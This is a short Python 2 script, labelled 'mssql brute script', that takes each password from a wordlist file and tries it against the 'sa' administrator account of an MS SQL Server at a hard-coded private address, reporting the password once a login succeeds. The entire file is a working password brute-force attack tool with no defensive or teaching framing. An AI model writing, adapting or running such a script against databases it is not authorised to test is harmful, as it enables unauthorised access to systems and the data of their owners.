import _mssql
import time
#################################################
def try_login(server,user,password):
    try:
        conn = _mssql.connect(server=server,user=user,password=password)
        if conn.connected:
            conn.close()
            return True
        else:
            return False
    except:
        return False
##################################################
def get_wordlist_from_file(filename):
    with open(filename,'r') as f:
        w = f.readlines()
    return w

##################################################
#-------------------------------------------------
pass_file = 'superdic.txt'
server = '192.168.1.228'
user = 'sa'
#-------------------------------------------------
def main():
    print '+'+'-'*40+'+'
    print ' '*10+'mssql brute script'
    print '+'+'-'*40+'+'
    print 'server : %s' %server
    print 'user : %s' %user
    print 'pass_file : %s' %pass_file
    print '+'+'-'*40+'+'
    pass_list = get_wordlist_from_file(pass_file)
    if pass_list is None:
        print '[-] wordlist is empty,exit.'
        return
    for p in pass_list:
        p = p.strip('\n')
        if try_login(server,user,p):
            print '+'+'='*40+'+'
            print '[+] brute success ,password is %s' %p
            print '+'+'='*40+'+'
            break
        else:
            print '[-] attempt to login with password %s failed.'%p
        time.sleep(0.1)
############################################################
if __name__=='__main__':
    main()













